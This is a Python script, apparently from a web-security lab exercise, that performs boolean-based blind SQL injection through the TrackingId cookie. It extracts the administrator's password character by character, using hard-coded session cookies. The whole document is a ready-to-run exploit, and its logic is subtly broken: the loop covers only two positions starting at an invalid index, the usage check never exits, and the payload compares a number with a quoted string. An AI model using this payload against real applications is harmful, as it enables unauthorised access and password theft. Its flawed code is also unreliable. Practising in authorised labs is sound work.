import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def sqli_password(url):
    password_extracted = ""
    with requests.Session() as session:
        for i in range(2):
            for j in range(32, 127):  # using the hash keys
                sqli_payload = f" ' and (select ascii(substring(password,{i},1)) from users where username='administrator')='{j}'--"
                sqli_payload_encoded = requests.utils.quote(sqli_payload)
                cookies = {'TrackingId': 'HDVNw4suQzu2277y' + sqli_payload_encoded,
                           'session': 'GxTzQ45Wc7Y9EWaWSngiX84gz63M0z7l'}  # place the TrackingId and session from the burpsuite
                r = session.get(url, cookies=cookies, verify=True)
                if "Welcome" not in r.text:
                    sys.stdout.write('\r' + password_extracted + chr(j))
                    sys.stdout.flush()
                else:
                    password_extracted += chr(j)
                    sys.stdout.write('\r' + password_extracted)
                    sys.stdout.flush()
                    break

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
       

    url = sys.argv[1]
    print("(+) Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()
